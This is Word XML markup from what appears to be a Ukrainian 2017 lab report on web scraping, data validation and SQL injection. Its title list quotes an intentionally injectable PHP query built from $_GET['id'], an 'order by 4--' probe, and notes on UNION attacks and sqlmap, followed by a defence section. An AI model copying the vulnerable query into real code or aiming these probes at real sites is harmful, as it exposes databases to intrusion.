        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00C12BBD" w:rsidRPr="0066454A" w:rsidSect="00981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1ADB46" w14:textId="77777777" w:rsidR="003171A0" w:rsidRDefault="003171A0" w:rsidP="00EB5B73">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7C3B4E03" w14:textId="77777777" w:rsidR="003171A0" w:rsidRDefault="003171A0" w:rsidP="00EB5B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Times New Roman CYR"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B6F36D" w14:textId="77777777" w:rsidR="003171A0" w:rsidRDefault="003171A0" w:rsidP="00EB5B73">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="412445AA" w14:textId="77777777" w:rsidR="003171A0" w:rsidRDefault="003171A0" w:rsidP="00EB5B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772EE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EEACEAD6"/>
    <w:lvl w:ilvl="0" w:tplc="70EC8A48">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Heading1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7DF"/>
    <w:rsid w:val="000147DF"/>
    <w:rsid w:val="000216E5"/>
    <w:rsid w:val="000B5119"/>
    <w:rsid w:val="00167A23"/>
    <w:rsid w:val="001743F4"/>
    <w:rsid w:val="0018436E"/>
    <w:rsid w:val="001E2FF3"/>
    <w:rsid w:val="001F09D5"/>
    <w:rsid w:val="0027534C"/>
    <w:rsid w:val="002A3325"/>
    <w:rsid w:val="002C50AB"/>
    <w:rsid w:val="003171A0"/>
    <w:rsid w:val="003954DC"/>
    <w:rsid w:val="003B1749"/>
    <w:rsid w:val="003F3122"/>
    <w:rsid w:val="0041144F"/>
    <w:rsid w:val="004518F3"/>
    <w:rsid w:val="004B7EE1"/>
    <w:rsid w:val="0058471D"/>
    <w:rsid w:val="006361BA"/>
    <w:rsid w:val="00646471"/>
    <w:rsid w:val="00646892"/>
    <w:rsid w:val="0066454A"/>
    <w:rsid w:val="006778D7"/>
    <w:rsid w:val="006D0FE8"/>
    <w:rsid w:val="007570A8"/>
    <w:rsid w:val="009816A6"/>
    <w:rsid w:val="009C50F8"/>
    <w:rsid w:val="00A0371E"/>
    <w:rsid w:val="00A26380"/>
    <w:rsid w:val="00AA4A1E"/>
    <w:rsid w:val="00AE0849"/>
    <w:rsid w:val="00C12BBD"/>
    <w:rsid w:val="00C20486"/>
    <w:rsid w:val="00C321F1"/>
    <w:rsid w:val="00C51CD9"/>
    <w:rsid w:val="00D60335"/>
    <w:rsid w:val="00D85A29"/>
    <w:rsid w:val="00DE01B3"/>
    <w:rsid w:val="00E73FAE"/>
    <w:rsid w:val="00E906C1"/>
    <w:rsid w:val="00EB489A"/>
    <w:rsid w:val="00EB5B73"/>
    <w:rsid w:val="00F42267"/>
    <w:rsid w:val="00F4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4BF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47DF"/>
    <w:pPr>
      <w:spacing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CD9"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:pageBreakBefore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646471"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="4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aliases w:val="Code"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0066454A"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
      <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
      <w:sz w:val="2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2BB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CD9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47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Theme="minorHAnsi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849"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:aliases w:val="Code Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="0066454A"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Courier" w:cstheme="majorBidi"/>
      <w:color w:val="1F3763" w:themeColor="accent1" w:themeShade="7F"/>
      <w:sz w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EB5B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B73"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial Unicode MS" w:hAnsi="Times New Roman" w:cs="Arial Unicode MS"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EB5B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B73"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial Unicode MS" w:hAnsi="Times New Roman" w:cs="Arial Unicode MS"/>
      <w:color w:val="000000"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="p1">
    <w:name w:val="p1"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00C12BBD"/>
    <w:pPr>
      <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Menlo" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Menlo" w:cs="Menlo"/>
      <w:sz w:val="17"/>
      <w:szCs w:val="17"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="s1">
    <w:name w:val="s1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00C12BBD"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="apple-converted-space">
    <w:name w:val="apple-converted-space"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00C12BBD"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00C12BBD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hljs-string">
    <w:name w:val="hljs-string"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00664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1259</Words>
  <Characters>7178</Characters>
  <Application>Microsoft Macintosh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70</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="71" baseType="lpstr">
      <vt:lpstr/>
      <vt:lpstr>Web Scrapping</vt:lpstr>
      <vt:lpstr>    </vt:lpstr>
      <vt:lpstr>    Код скрипту</vt:lpstr>
      <vt:lpstr>    Результат роботи</vt:lpstr>
      <vt:lpstr>Data validation</vt:lpstr>
      <vt:lpstr>    Код form.php</vt:lpstr>
      <vt:lpstr>    Код process.php</vt:lpstr>
      <vt:lpstr>    Передбачуваний результат роботи</vt:lpstr>
      <vt:lpstr>        /</vt:lpstr>
      <vt:lpstr>    Непередбачуване виконання CSS</vt:lpstr>
      <vt:lpstr>        /</vt:lpstr>
      <vt:lpstr>SQL injection</vt:lpstr>
      <vt:lpstr>    Основна інформація про базу даних та таблиці</vt:lpstr>
      <vt:lpstr>        База даних: c9</vt:lpstr>
      <vt:lpstr>    Код simple-page.php</vt:lpstr>
      <vt:lpstr>        &lt;?php include_once('connect.php'); ?&gt;</vt:lpstr>
      <vt:lpstr>        &lt;!DOCTYPE html&gt;</vt:lpstr>
      <vt:lpstr>        &lt;html lang="en"&gt;</vt:lpstr>
      <vt:lpstr>        &lt;head&gt;</vt:lpstr>
      <vt:lpstr>        &lt;meta charset="UTF-8"&gt;</vt:lpstr>
      <vt:lpstr>        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</vt:lpstr>
      <vt:lpstr>        &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;</vt:lpstr>
      <vt:lpstr>        &lt;title&gt;SQL injection&lt;/title&gt;</vt:lpstr>
      <vt:lpstr>        </vt:lpstr>
      <vt:lpstr>        &lt;?php</vt:lpstr>
      <vt:lpstr>        error_reporting(0);</vt:lpstr>
      <vt:lpstr>        $x = $_GET['id'];</vt:lpstr>
      <vt:lpstr>        $query = "SELECT * FROM users WHERE id=$x";</vt:lpstr>
      <vt:lpstr>        $result = mysqli_query($connection, $query);</vt:lpstr>
      <vt:lpstr>        if (!$result) {</vt:lpstr>
      <vt:lpstr>        die('Query failed '.mysqli_error($connection));</vt:lpstr>
      <vt:lpstr>        }</vt:lpstr>
      <vt:lpstr>        while ($lel = mysqli_fetch_array($result)) {</vt:lpstr>
      <vt:lpstr>        echo "&lt;h2&gt;&lt;pre&gt;Hello and Welcome to our site, ".$lel['login']."&lt;/pre</vt:lpstr>
      <vt:lpstr>        break;</vt:lpstr>
      <vt:lpstr>        }</vt:lpstr>
      <vt:lpstr>        ?&gt;</vt:lpstr>
      <vt:lpstr>        </vt:lpstr>
      <vt:lpstr>        &lt;?php</vt:lpstr>
      <vt:lpstr>        if (!mysqli_connect_errno()) {</vt:lpstr>
      <vt:lpstr>        echo " :3 ".mysqli_error($connection);</vt:lpstr>
      <vt:lpstr>        }</vt:lpstr>
      <vt:lpstr>        ?&gt;</vt:lpstr>
      <vt:lpstr>        </vt:lpstr>
      <vt:lpstr>        &lt;/head&gt;</vt:lpstr>
      <vt:lpstr>        &lt;body&gt;</vt:lpstr>
      <vt:lpstr>        &lt;/body&gt;</vt:lpstr>
      <vt:lpstr>        &lt;/html&gt;</vt:lpstr>
      <vt:lpstr>    Код connect.php</vt:lpstr>
      <vt:lpstr>        &lt;?php</vt:lpstr>
      <vt:lpstr>        //Connect to the database</vt:lpstr>
      <vt:lpstr>        $host = "127.0.0.1";</vt:lpstr>
      <vt:lpstr>        $user = "kushkamisha";</vt:lpstr>
      <vt:lpstr>        $pass = "";</vt:lpstr>
      <vt:lpstr>        $db = "c9";</vt:lpstr>
      <vt:lpstr>        $port = 3306;</vt:lpstr>
      <vt:lpstr>        </vt:lpstr>
      <vt:lpstr>        $connection = mysqli_connect($host, $user, $pass, $db, $port)or die(mysql_er</vt:lpstr>
      <vt:lpstr>        ?&gt;</vt:lpstr>
      <vt:lpstr>    Нормальна робота сайту</vt:lpstr>
      <vt:lpstr>        /</vt:lpstr>
      <vt:lpstr>    Виявлення кількості колонок в таблиці</vt:lpstr>
      <vt:lpstr>        При спробі додання до url-адреси “id=1 order by 4--“ отримуємо</vt:lpstr>
      <vt:lpstr>        помилку на сайті:</vt:lpstr>
      <vt:lpstr>    Виявлення номеру колонки, що відповідає за логін</vt:lpstr>
      <vt:lpstr>        Скористаємося SQL-командою union, що додає до поточного запиту додатковий. В дан</vt:lpstr>
      <vt:lpstr>    Злам за допомогою утиліти sqlmap</vt:lpstr>
      <vt:lpstr>    Захист</vt:lpstr>
      <vt:lpstr>        Проте, як не дивно захист від такого виду зламу дуже простий: фільтрувати дані.</vt:lpstr>
      <vt:lpstr>        </vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>8421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Kushka</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Misha Kushka</cp:lastModifiedBy>
  <cp:revision>26</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-12-16T16:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-12-16T18:49:00Z</dcterms:modified>
</cp:coreProperties>
</file>